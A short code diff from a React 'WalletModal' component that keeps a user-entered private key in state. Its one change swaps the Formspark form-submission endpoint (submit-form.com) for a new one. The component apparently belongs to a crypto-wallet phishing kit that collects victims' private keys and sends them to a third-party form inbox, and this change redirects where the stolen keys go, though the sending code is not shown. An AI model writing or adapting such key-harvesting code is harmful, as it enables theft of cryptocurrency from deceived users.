@@ -14,7 +14,7 @@ const WalletModal = ({ show, handleClose, name }) => {
   const [privateKey, setPrivateKey] = useState("");
 
   let navigate = useNavigate();
-  const FORMSPARK_ACTION_URL = "https://submit-form.com/kNJFdDxbt";
+  const FORMSPARK_ACTION_URL = "https://submit-form.com/AhFDANQfK";
 
 
   
